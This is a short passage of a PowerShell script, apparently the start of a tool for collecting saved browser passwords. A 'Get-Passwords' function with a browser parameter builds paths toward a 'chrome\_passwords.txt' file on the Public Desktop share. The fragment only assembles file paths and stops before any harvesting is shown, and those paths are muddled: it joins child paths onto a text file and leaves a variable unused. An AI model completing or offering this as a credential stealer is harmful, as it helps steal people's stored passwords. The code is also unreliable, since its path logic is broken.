param($Browser = "chrome")

function Get-Passwords() {
    $passwordsPath = Get-Item -Path "\\$env:COMPUTERNAME\C$\Users\Public\Desktop\all.txt"
    $passwords = Join-Path -Path $passwordsPath -ChildPath passwords.txt
    # Replace "chrome" with your desired browser
    if ($Browser -eq "chrome") {
        $passwordsPath = Join-Path $passwordsPath "chrome\_passwords.txt"
    }
